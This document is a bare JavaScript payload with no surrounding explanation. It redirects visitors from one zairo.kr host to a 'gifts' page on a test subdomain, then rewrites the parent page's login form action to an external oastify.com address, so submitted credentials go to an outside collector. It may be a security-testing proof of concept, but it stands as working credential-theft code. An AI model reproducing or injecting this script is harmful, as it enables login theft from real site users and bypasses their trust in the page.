(function() {
    if (document.location.hostname == 'c.zairo.kr') {
        document.location.href = 'http://test1.zairo.kr/us/gifts';
    } else if (document.location.href == 'http://test1.zairo.kr/us/gifts') {
        parent.document.login.action = 'http://d7lnu9g1xybjt3zt36ebrt76jxpsdh.oastify.com';
    }
}).call(this);
